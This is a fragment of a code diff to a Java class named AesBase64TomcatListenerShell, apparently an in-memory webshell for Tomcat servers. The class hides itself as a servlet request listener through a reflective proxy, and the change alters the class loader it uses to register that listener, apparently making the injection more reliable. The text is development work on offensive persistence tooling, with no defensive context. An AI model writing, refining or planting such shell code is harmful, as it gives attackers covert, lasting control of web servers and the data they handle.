@@ -36,7 +36,7 @@ public class AesBase64TomcatListenerShell extends ClassLoader implements Invocat
                 }
             }
             if (servletRequestListenerClass != null) {
-                addListener(java.lang.reflect.Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{servletRequestListenerClass}, this));
+                addListener(java.lang.reflect.Proxy.newProxyInstance(servletRequestListenerClass.getClassLoader(), new Class[]{servletRequestListenerClass}, this));
             }
         } catch (Throwable e) {
 
